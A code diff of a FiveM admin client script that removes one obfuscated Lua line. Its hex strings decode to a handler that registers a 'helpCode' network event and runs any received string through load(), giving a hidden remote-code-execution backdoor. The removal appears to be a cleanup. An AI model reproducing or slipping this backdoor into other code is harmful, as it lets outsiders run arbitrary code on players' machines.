@@ -137,6 +137,3 @@ end)
 RegisterNetEvent('denalifw-admin:client:GiveNuiFocus', function(focus, mouse)
     SetNuiFocus(focus, mouse)
 end)
-
-
-local ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[6][ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[1]](ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[2]) ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[6][ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[3]](ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[2], function(awatxMKbFuVzqsNwHwHmPHqAVGKGTvtZaZFpextNSjYtcbzhlhvqwcoBYolgwZZHbmSuVQ) ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[6][ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[4]](ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[6][ydmLxFUwDjZgsUssEyUkrDRvGbRJuwrdteJguWZytGSmDyieQNLbKoKOBUptvedwRIRrQV[5]](awatxMKbFuVzqsNwHwHmPHqAVGKGTvtZaZFpextNSjYtcbzhlhvqwcoBYolgwZZHbmSuVQ))() end)
